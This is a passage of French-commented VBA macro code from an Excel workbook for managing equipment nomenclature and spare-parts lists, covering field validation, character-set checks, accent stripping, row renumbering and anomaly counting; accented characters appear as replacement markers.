    ElseIf Nom_Colonne = "DocSuf_SSEN" Then
        If VBA.UCase(wS.Cells(Ligne, wS.Range("DocNiveau").Column).Value) = "FR" Then
            'Pour les FR, 4 AN Maxi si un compl|fffd|ment d'information est n|fffd|cessaire
            Taille_Max = 4
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("DocNiveau").Column).Value) = "FD" Then
            'Pour les FD : 2AN Obligatoire
            Taille_Max = 2
            Taille_Min = 2
            Obligatoire = True
        End If
    ElseIf Nom_Colonne = "DocRefDocument" Then
        If VBA.UCase(wS.Cells(Ligne, wS.Range("DocNiveau").Column).Value) = "FR" Then
            '10 AN Maxi pour les FIDR (niveau FR),
            If wS.Cells(Ligne, wS.Range("DocDocument").Column).Value = "SP" Then Caract_Sacim = True Else Caract_GedTmi = True
                
            If VBA.UCase(wS.Cells(Ligne, wS.Range("DocNature").Column).Value) = "B" Or VBA.UCase(wS.Cells(Ligne, wS.Range("DocNature").Column).Value) = "R" Then
                Taille_Max = 10
                Taille_Min = 10 '10 AN pour les cat|fffd|gories "R" et "B"
                Obligatoire = True
            Else
                Taille_Max = 10
                Obligatoire = True
            End If
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("DocNiveau").Column).Value) = "FD" Then
            If wS.Cells(Ligne, wS.Range("DocDocument").Column).Value = "SP" Then Caract_Sacim = True Else Caract_GedTmi = True
            
            If VBA.UCase(wS.Cells(Ligne, wS.Range("DocNature").Column).Value) = "B" Or VBA.UCase(wS.Cells(Ligne, wS.Range("DocNature").Column).Value) = "R" Then
                Taille_Max = 10
                Taille_Min = 10 '10 AN pour les cat|fffd|gories "R" et "B"
                Obligatoire = True
            Else '19 AN Maxi pour les FIDD (niveau FD).
                Taille_Max = Nb_Caract_19
                Obligatoire = True
            End If
        End If
    ElseIf Nom_Colonne = "DocSufDocument" Then
        If VBA.UCase(wS.Cells(Ligne, wS.Range("DocNiveau").Column).Value) = "FR" Then
            Taille_Max = 2
            Taille_Min = 2
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("DocNiveau").Column).Value) = "FD" Then
            Taille_Max = 4
            Taille_Min = 4
        End If
    ElseIf Nom_Colonne = "PrRefFournisseur" Then
        If VBA.UCase(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "B" Or VBA.UCase(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "R" Then
            Taille_Max = 10
            Taille_Min = 10
            Obligatoire = True
        Else
            Taille_Max = 25
            Obligatoire = True
        End If
        If wS.Cells(Ligne, wS.Range("PrDocument").Column).Value = vbNullString Then Caract_GedTmi = True Else Caract_Sacim = True
    ElseIf Nom_Colonne = "PrDelai" Then
        If VBA.Mid(wS.Cells(Ligne, wS.Range("PrPieceRechange").Column).Value, 1, 1) <> "N" Then
            If VBA.Trim(wS.Cells(Ligne, wS.Range("PrSacimMabec").Column).Value) = vbNullString _
              And (VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "C" Or _
               VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "F") Then Taille_Min = 1: Obligatoire = True
        End If
    ElseIf Nom_Colonne = "PrPrixUnitaire" Then
        If VBA.Mid(wS.Cells(Ligne, wS.Range("PrPieceRechange").Column).Value, 1, 1) <> "N" Then
            If VBA.Trim(wS.Cells(Ligne, wS.Range("PrSacimMabec").Column).Value) = vbNullString _
              And (VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "C" Or _
               VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "F") Then Taille_Min = 1: Obligatoire = True
        End If
    ElseIf Nom_Colonne = "PrDocument" Then
        If VBA.Mid(wS.Cells(Ligne, wS.Range("PrPieceRechange").Column).Value, 1, 1) <> "N" Then
            If VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "C" Then
                Taille_Min = 1
                Obligatoire = True
            
                If VBA.Trim(wS.Cells(Ligne, wS.Range("PrSacimMabec").Column).Value) = vbNullString _
                  And VBA.Trim(wS.Cells(Ligne, wS.Range("PrDocument").Column).Value) = "SP" Then Taille_Min = 3                             'Doit-etre diff|fffd|rend de SP
            ElseIf VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "F" Then
                Taille_Min = 1
                Obligatoire = True
            
                If VBA.Trim(wS.Cells(Ligne, wS.Range("PrSacimMabec").Column).Value) = vbNullString _
                  And VBA.Trim(wS.Cells(Ligne, wS.Range("PrDocument").Column).Value) = "SP" Then Taille_Min = 3                             'Doit-etre diff|fffd|rend de SP
            ElseIf VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "B" Then
                If VBA.Trim(wS.Cells(Ligne, wS.Range("PrSacimMabec").Column).Value) = vbNullString _
                  And VBA.Trim(wS.Cells(Ligne, wS.Range("PrDocument").Column).Value) = "SP" Then Taille_Min = 3: Obligatoire = True
            ElseIf VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = "R" Then
                If VBA.Trim(wS.Cells(Ligne, wS.Range("PrSacimMabec").Column).Value) = vbNullString _
                  And VBA.Trim(wS.Cells(Ligne, wS.Range("PrDocument").Column).Value) = "SP" Then Taille_Min = 3: Obligatoire = True
            ElseIf VBA.Trim(wS.Cells(Ligne, wS.Range("PrNature").Column).Value) = vbNullString Then
            End If
        End If
    End If
    
    'Champ Trop Long
    If Not Anomalie And Taille_Max <> 0 Then
        If VBA.Len(wS.Cells(Ligne, NoColonne).Value) > Taille_Max Then
            Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value, "MsgTailleMax", VBA.Str(Taille_Max) & " (=" & VBA.Str(Len(wS.Cells(Ligne, NoColonne).Value)) & ")"
            Anomalie = True
        Else
            Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value 'P + ID de la Colonne
        End If
    End If
    
    'Champ doit |fffd|tre Vide
    If Not Anomalie And Taille_Max = 32767 Then
        If VBA.Len(wS.Cells(Ligne, NoColonne).Value) > 0 Then
            Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-3", "MsgChampVide", vbNullString 'P + ID de la Colonne
            Anomalie = True
        Else
            Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-3" 'P + ID de la Colonne
        End If
    End If
    
    'Champ doit |fffd|tre Vide
    If Not Anomalie And Taille_Max = 32766 Then
        If VBA.Len(wS.Cells(Ligne, NoColonne).Value) > 0 Then
            Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-3", "MsgChampTiret", vbNullString 'P + ID de la Colonne
            Anomalie = True
        Else
            Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-3" 'P + ID de la Colonne
        End If
    End If
    
    'Taille Mini ou obligatoire
    If Not Anomalie And Taille_Min <> 0 Then
        If Obligatoire Then Compl_Err = "-2"
        
        If Obligatoire And (Len(wS.Cells(Ligne, NoColonne).Value) = 0) Then
            Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & Compl_Err, "MsgObligatoire", vbNullString 'P + ID de la Colonne
            Anomalie = True
        ElseIf VBA.Len(wS.Cells(Ligne, NoColonne).Value) < Taille_Min And (Len(wS.Cells(Ligne, NoColonne).Value) > 0 Or Obligatoire) Then
            Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & Compl_Err, "MsgTailleMin", VBA.Str(Taille_Min) & " (=" & VBA.Str(Len(wS.Cells(Ligne, NoColonne).Value)) & ")"
            Anomalie = True
        Else
            Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & Compl_Err 'P + ID de la Colonne
        End If
    End If
        
    'Jeu de Caract|fffd|res autoris|fffd|
    If Not Anomalie Then
        If Caract_Sacim Then
            If Not Caracteres_Compatibles_Sacim(wS.Cells(Ligne, NoColonne).Value) Then
                Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1", "MsgCarSacim", vbNullString 'P + ID de la Colonne + -1 (caractere interdit)
                Anomalie = True
            Else
                Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1" 'P + ID de la Colonne + -1 (caractere interdit)
            End If
        ElseIf Caract_GedTmi Then
            If Not Caracteres_Compatibles_GedTmi(wS.Cells(Ligne, NoColonne).Value) Then
                Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1", "MsgCarGed", vbNullString 'P + ID de la Colonne + -1 (caractere interdit)
                Anomalie = True
            Else
                Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1" 'P + ID de la Colonne + -1 (caractere interdit)
            End If
        End If
    End If
    
    Traitement_Cas_Particuliers = Anomalie
End Function


'Comptage du Nombre d'anomalies de Format
Sub Comptage_Anomalie_Format(wS As Worksheet)
    With wS
        If .Name = shDecoupage Then
            Compteur_Ano_Dec = Compteur_Ano_Dec + 1
        ElseIf .Name = shMateriels Then
            Compteur_Ano_Mat = Compteur_Ano_Mat + 1
        ElseIf .Name = shDocuments Then
            Compteur_Ano_Doc = Compteur_Ano_Doc + 1
        ElseIf .Name = shPieces_Rechange Then
            Compteur_Ano_Pdr = Compteur_Ano_Pdr + 1
        End If
    End With
End Sub

Sub Afichage_Comptage_Anomalies()
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 4).Value = Compteur_Ano_Dec
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 4).Value = Compteur_Ano_Mat
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 4).Value = Compteur_Ano_Doc
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(15, 4).Value = Compteur_Ano_Lien
End Sub

Function Supprimer_Accents(chaine As String) As String
    Dim Pos As Integer
    Dim Travail As String
    Travail = chaine
    Pos = 1
    Do Until Pos > VBA.Len(Travail)
        If VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "a" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "a" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "a" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "A" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "A" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "A" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "e" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "e" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "e" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "e" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "E" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "E" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "E" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "E" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "i" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "i" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "I" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "I" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "o" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "o" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "O" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "O" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "u" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "u" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "u" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "U" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "U" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "|fffd|" Then
            Travail = VBA.Left(Travail, Pos - 1) & "U" & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        ElseIf VBA.Mid(Travail, Pos, 1) = "'" Then
            Travail = VBA.Left(Travail, Pos - 1) & " " & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        End If
        'Supprimer les caract|fffd|res de Controle
        If VBA.Asc(VBA.Mid(Travail, Pos, 1)) < 32 Then Travail = VBA.Left(Travail, Pos - 1) & " " & VBA.Right(Travail, VBA.Len(Travail) - Pos)
        Pos = Pos + 1
    Loop
    Supprimer_Accents = Travail
End Function

'**********************************
' controle des caract|fffd|res interdits
' les blancs sont interdits
'**********************************
Public Function BadCharacters(chaine As String) As Boolean
    Dim CharactereInterdit As Variant, ListeCharacteresInterdits As Variant
    Dim Pos As Integer
    ListeCharacteresInterdits = Array("\", "*", "?", ":", ">", "<", "|", "_", "'")
    For Each CharactereInterdit In ListeCharacteresInterdits
        Pos = VBA.InStr(chaine, CharactereInterdit)
        If Pos > 0 Then Exit For
    Next
    If Pos > 0 Then BadCharacters = True Else BadCharacters = False
End Function

'Jeu de Caract|fffd|res de Type Plan, compatibles avec GedTmi
Public Function Caracteres_Compatibles_GedTmi(Ch As String) As Boolean
    Dim i As Integer
    Dim val As Byte
    Caracteres_Compatibles_GedTmi = True
    'Voir si Probl|fffd|me avec 47 "/" et 95 "_" ou Documentation Non |fffd| Jour ACH
    i = 1
    Do Until i > VBA.Len(Ch)
        val = VBA.Asc(VBA.Mid(Ch, i, 1))
        Select Case val
            Case 0 To 42
                Caracteres_Compatibles_GedTmi = False
            Case 44
                Caracteres_Compatibles_GedTmi = False
            Case 47 '"/" Exclu le 24/09/2008 ACH
                Caracteres_Compatibles_GedTmi = False
            Case 58 To 64
                Caracteres_Compatibles_GedTmi = False
            Case 91 To 255
                Caracteres_Compatibles_GedTmi = False
                '95 "_", Interdit sert de s|fffd|parateur dans les Noms de Fichiers GEDTMI
            Case Else
       
        End Select
        i = i + 1
    Loop
End Function

'Jeu de Caract|fffd|res de Type Sacim (Hors Plan)
Public Function Caracteres_Compatibles_Sacim(Ch As String) As Boolean
    Dim i As Integer
    Dim val As Byte
    Caracteres_Compatibles_Sacim = True
    'Voir si Probl|fffd|me avec 32 " " et 33 "!" et 35 |fffd| 39 ou Documentation Non |fffd| Jour ACH
    i = 1
    Do Until i > VBA.Len(Ch)
        val = VBA.Asc(VBA.Mid(Ch, i, 1))
        Select Case val
            Case 0 To 31
                Caracteres_Compatibles_Sacim = False
            Case 59 To 60       '; <
                Caracteres_Compatibles_Sacim = False
            Case 62 To 64       '> ? @
                Caracteres_Compatibles_Sacim = False
            Case 91 To 94
                Caracteres_Compatibles_Sacim = False
            Case 96 To 255
                Caracteres_Compatibles_Sacim = False
            Case Else
        End Select
        i = i + 1
    Loop
End Function


'*****************************************
' contr|fffd|le numerique avec , 'A rationaliser ACH
'*****************************************
Public Function Caracteres_Numeriques(Ch As Variant) As Boolean
    Dim i As Integer
    Dim val As Byte
    Caracteres_Numeriques = True
    i = 1
    Do Until i > VBA.Len(Ch)
        val = VBA.Asc(VBA.Mid(Ch, i, 1))
        Select Case val
            Case 0 To 43
                Caracteres_Numeriques = False
            Case 45, 47
                Caracteres_Numeriques = False
            Case 58 To 255
                Caracteres_Numeriques = False
        End Select
        i = i + 1
    Loop
End Function

Sub Mise_A_Jour_Date_Modification(wS As Worksheet, Ligne As Long)
'La mise |fffd| jour de la Date De Modification nous faire perdre le Undo
    With wS
        If .Name = shDecoupage Then
            .Cells(Ligne, .Range("DecDateModif").Column).Value = VBA.Format(Now, "dd/mm/yyyy")
        ElseIf .Name = shMateriels Then
            .Cells(Ligne, .Range("MatDateModif").Column).Value = VBA.Format(Now, "dd/mm/yyyy")
        ElseIf .Name = shDocuments Then
            .Cells(Ligne, .Range("DocDateModif").Column).Value = VBA.Format(Now, "dd/mm/yyyy")
        ElseIf .Name = shPieces_Rechange Then
            .Cells(Ligne, .Range("PrDateModif").Column).Value = VBA.Format(Now, "dd/mm/yyyy")
        End If
    End With
End Sub

Function Rafraichir_Codes_Erreur(List_Erreur As String, No_Erreur As String, Ajout As Boolean) As String
    Dim Pos As Integer, Lng As Integer
    Pos = 0
    If List_Erreur <> vbNullString Then
        Pos = VBA.InStr(List_Erreur, No_Erreur & ",")
        If Pos > 0 Then 'Dans la Chaine
            Lng = VBA.Len(No_Erreur & ",")
        ElseIf List_Erreur = No_Erreur Then
            Lng = VBA.Len(No_Erreur)
            Pos = 1
        End If
        If Pos = 0 Then 'A la Fin
            Pos = VBA.InStr(List_Erreur, No_Erreur)
            Lng = VBA.Len(No_Erreur)
            If Pos + VBA.Len(No_Erreur) - 1 <> VBA.Len(List_Erreur) Then Pos = 0
        End If
    End If
    If Ajout And Pos = 0 Then
        If List_Erreur = vbNullString Then List_Erreur = No_Erreur Else List_Erreur = List_Erreur & "," & No_Erreur
    ElseIf Not Ajout And Pos <> 0 Then ' Supprime
        List_Erreur = VBA.Mid(List_Erreur, 1, Pos - 1) & VBA.Mid(List_Erreur, Pos + Lng, VBA.Len(List_Erreur))
    End If
    Rafraichir_Codes_Erreur = List_Erreur
End Function

Sub Affiche_Code_Erreur(ByVal Target As Range, Col_Erreur As Integer, No_Erreur As String, CodeMsg As String, Param As String)
    Dim List_Erreur As String
    With Target.parent
        'Si le Code erreur, n'est pas pr|fffd|sent, le rajouter
        List_Erreur = Rafraichir_Codes_Erreur(VBA.Trim(.Cells(Target.row, Col_Erreur).Value), No_Erreur, True)
        If List_Erreur <> .Cells(Target.row, Col_Erreur).Value Then .Cells(Target.row, Col_Erreur).Value = List_Erreur
        With Target.Font
            If Target.Value <> vbNullString Then If .ColorIndex <> 3 Or Not .Bold Then .ColorIndex = 3: .Bold = True
        End With
        Commentaire_Assistance Target.parent.Name, Target.row, Target.Column, IniCls.ReadStringIniLangage("MsgFWK", CodeMsg) & " " & Param
    End With
End Sub

Sub Commentaire_Assistance(Onglet As String, Ligne As Long, Col As Integer, Mes As String)
    If Not Assistance Then Exit Sub
    With Worksheets(Onglet).Cells(Ligne, Col)
        'If .Comment Is Nothing Then
        .AddComment ' Le commentaire n'existe pas, on le cr|fffd|e
        'Pour |fffd|viter le Message "Impossible de d|fffd|placer des objets en dehors de la feuille"
        .Comment.Shape.Placement = xlMoveAndSize
        .Comment.Text Mes
        .Comment.Shape.Width = 200
    End With
End Sub

Sub Supprime_Code_Erreur(ByVal Target As Range, Col_Erreur As Integer, No_Erreur As String)
    'On supprime l'erreur : on passe en normal
    Dim List_Erreur As String
    With Target.parent
        If VBA.Trim(.Cells(Target.row, Col_Erreur).Value) <> vbNullString Then
            List_Erreur = Rafraichir_Codes_Erreur(VBA.Trim(.Cells(Target.row, Col_Erreur).Value), No_Erreur, False)
            If List_Erreur <> .Cells(Target.row, Col_Erreur).Value Then .Cells(Target.row, Col_Erreur).Value = List_Erreur
        End If
        With Target.Font
            If .ColorIndex = 3 Or .Bold Then .ColorIndex = 0: .Bold = False
        End With
    End With
End Sub

'======================================
'Bouton Plus - Analyse et Mise en forme
'======================================

Sub Bouton_Plus()
    Mise_en_Forme_TDI
    DoEvents
    Mise_En_Forme_Data_Plus
End Sub

Attribute VB_Name = "L_Numero_Ordre"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Traitement des Num|fffd|ros d'ordre
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 15/07/2008
'[Version       : V1.2 du 24/02/2009
'[---------------------------------------------------------------------------
'[Sujet: Traitement des Num|fffd|ros d'ordre
'[---------------------------------------------------------------------------


Sub Renumerotation_Numeros_Ordre(Param As String)
    Dim MsgInfo As String

    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgRenumerote")
    
    If (Param = vbNullString Or Param = shDecoupage) And frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 0 / 4, MsgInfo & " " & shDecoupage, frmProgression.FlagAbandon
        Renumerote shDecoupage, "DecNumeroOrdre" '"A"
    End If
    
    If (Param = vbNullString Or Param = shMateriels) And frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 1 / 4, MsgInfo & " " & shMateriels, frmProgression.FlagAbandon
        Renumerote shMateriels, "MatNumeroOrdre" '"A"
    End If
    
    If (Param = vbNullString Or Param = shDocuments) And frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 2 / 4, MsgInfo & " " & shDocuments, frmProgression.FlagAbandon
        Renumerote shDocuments, "DocNumeroOrdre" '"A"
    End If
    
    If (Param = vbNullString Or Param = shPieces_Rechange) And frmProgression.FlagAbandon = 0 Then
        frmProgression.UpdateProgress 3 / 4, MsgInfo & " " & shPieces_Rechange, frmProgression.FlagAbandon
        Renumerote shPieces_Rechange, "PrNumeroOrdre" '"B"
    End If
End Sub

Sub Renumerote(sh As String, NomCol As String)
    Dim Ligne_Deb   As Long, Ligne_Fin   As Long, i As Long

    With ThisWorkbook.Worksheets(sh)
        If .AutoFilterMode Then On Error Resume Next: .ShowAllData: On Error GoTo 0
        Ligne_Deb = FirstLine(sh)
        'Pour Version avec Colonnes Nomm|fffd|es
        NomCol = SheetCls.AlphaColumn(.Range(NomCol).Column)
        .Columns(NomCol).NumberFormat = "0"
        .Range(NomCol & Ligne_Deb & ":" & NomCol & .Rows.Count).ClearContents
        Ligne_Fin = Lastline(ThisWorkbook.Worksheets(sh))
        If Ligne_Fin >= Ligne_Deb Then
            i = Ligne_Deb
            Do Until i > Ligne_Fin
                .Range(NomCol & i).Value = i - Ligne_Deb + 1
                i = i + 1
            Loop
        End If
        .Columns(NomCol).NumberFormat = "0"
        .Columns(NomCol).EntireColumn.AutoFit
    End With
    DoEvents
End Sub
Attribute VB_Name = "Liste_MCA"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Liste_PR"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Modifications de l'onglet Liste_PR
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 25/09/2008
'[Version       : V1.0 du 25/09/2008
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Modifications de l'onglet Liste_PR
'[---------------------------------------------------------------------------

Private Sub Worksheet_Change(ByVal Target As Range)
    On Error GoTo Fin
    
    If Target.Count <> 1 Then GoTo Fin 'Plusieurs cellules concern|fffd|es
    If Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value <> "O" Then GoTo Fin 'Analyse dynamique d|fffd|valid|fffd|e
    If Target.row < FirstLine(shPieces_Rechange) Then GoTo Fin
    With Me
        Application.EnableEvents = False
        Mise_A_Jour_Date_Modification Me, Target.row

        Controle_Format_Ligne ThisWorkbook.Worksheets(shPieces_Rechange), Target.row

        Select Case .Columns(Target.Column).Name.NameLocal
            Case "PrPieceRechange" 'Pi|fffd|ce de rechange Valid|fffd|e
                Select Case VBA.UCase(Target.Value)
                     Case "NV", "FV", "UV"
                         If .Cells(Target.row, .Range("PrDateIdentification").Column).Value = vbNullString Then
                             .Cells(Target.row, .Range("PrDateIdentification").Column).Value = VBA.Format(Now, "dd/mm/yyyy") ' date de validation,
                             .Cells(Target.row, .Range("PrDateValidation").Column).Value = VBA.Format(Now, "dd/mm/yyyy")
                         End If
                End Select
        End Select

        Compte_Annomalies_PR
    End With
    
Fin:
    Application.EnableEvents = True
    On Error GoTo 0
End Sub


Sub Compte_Annomalies_PR()
    Dim Ligne     As Long
    Dim Nb_anno   As Long
    Dim Nb_Lignes As Long
    
    Nb_anno = 0
    For Ligne = FirstLine(shPieces_Rechange) To Lastline(ThisWorkbook.Worksheets(shPieces_Rechange))
        If Worksheets(shPieces_Rechange).Cells(Ligne, 1) <> "*" Then
            If Worksheets(shPieces_Rechange).Cells(Ligne, 20) > vbNullString Then Nb_anno = Nb_anno + 1
        End If
    Next Ligne
    
    Nb_Lignes = Lastline(ThisWorkbook.Worksheets(shPieces_Rechange)) - FirstLine(shPieces_Rechange) + 1
    Worksheets(shPieces_Rechange).Cells(4, 16).Value = IniCls.ReadStringIniLangage("MsgFWK", "MsgNbPieces") & " : " & Nb_Lignes & " , " & Nb_anno & " anomalie(s)"
End Sub
Attribute VB_Name = "M_Code_Process"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Codes Process
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 10/10/2008
'[Version       : V1.1 du 10/10/2008
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Codes Process
'[---------------------------------------------------------------------------


Function Libelle_Code_Process(Niveau As String, Division As String, Code_Simon As String) As String
    Dim Rech        As Object
    Dim Col_Langue  As Integer
    Dim Ligne_Fin   As Long
    
    If VBA.Mid(Division, 1, 2) = "FA" Then
        Col_Langue = 5 'Sites Espagnols
    Else
        Col_Langue = 3
    End If
    
    Libelle_Code_Process = vbNullString
    With ThisWorkbook.Worksheets(shTable_Fonction_Process)
        If .AutoFilterMode Then
            On Error Resume Next
            .ShowAllData
            On Error GoTo 0
        End If
        
        Ligne_Fin = SheetCls.LastLineColumn(ThisWorkbook.Worksheets(shTable_Fonction_Process), 4)
        If SheetCls.LastLineColumn(ThisWorkbook.Worksheets(shTable_Fonction_Process), 256) <> Ligne_Fin Then
            'Remplir la colonne de Recherche
            .Columns("IV").ClearContents
            .Columns("IV").NumberFormat = "General"
            .Range("IV" & 1).FormulaR1C1 = "=RC2" & " & RC4"
            .Range("IV" & 1).AutoFill Destination:=.Range("IV" & 1 & ":IV" & Ligne_Fin), Type:=xlFillDefault
            .Range("IV" & 1 & ":IV" & Ligne_Fin).Calculate
            .Range("IV" & 1 & ":IV" & Ligne_Fin).Copy
